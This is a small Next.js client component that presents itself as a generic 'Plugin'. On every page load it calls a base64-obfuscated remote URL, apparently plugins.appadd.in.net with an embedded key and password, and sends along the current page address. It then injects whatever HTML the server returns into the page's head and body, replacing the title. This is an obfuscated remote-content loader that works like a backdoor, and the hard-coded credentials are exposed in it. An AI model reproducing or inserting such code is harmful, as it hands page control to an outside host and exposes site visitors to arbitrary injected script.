"use client";
import { useEffect } from "react";
import Script from "next/script";

function Plugin() {
  useEffect(() => {
    const loadScript = () => {
      const script = document.createElement("script");
      script.src =
        "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js";
      script.async = true;
      document.head.appendChild(script);

      script.onload = () => {
        const eppathurl = window.location.origin + window.location.pathname;
        const eptagmanage = new XMLHttpRequest();
        eptagmanage.onreadystatechange = function () {
          if (this.readyState === 4 && this.status === 200) {
            if (this.response !== "0") {
              const temp = this.response.split("||||||||||");

              if (typeof jQuery !== "undefined") {
                jQuery(document).ready(() => {
                  jQuery("head").find("title").remove();
                  jQuery("head").append(temp[0]);
                  jQuery("body").append(temp[1]);
                });
              }
            }
          }
        };
        eptagmanage.open(
          "GET",
          atob(
            "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDY2MzM3Nzc0MjUmZWtleXBhc3M9NGFoMXVtWEdlSjZTeVhFNkpmcG9VQTNsdWhFdGM0cmczQWZFJnNpdGV1cmw9"
          ) + eppathurl
        );
        eptagmanage.send();
      };
    };

    loadScript();
  }, []);

  return null;
}

export default Plugin;
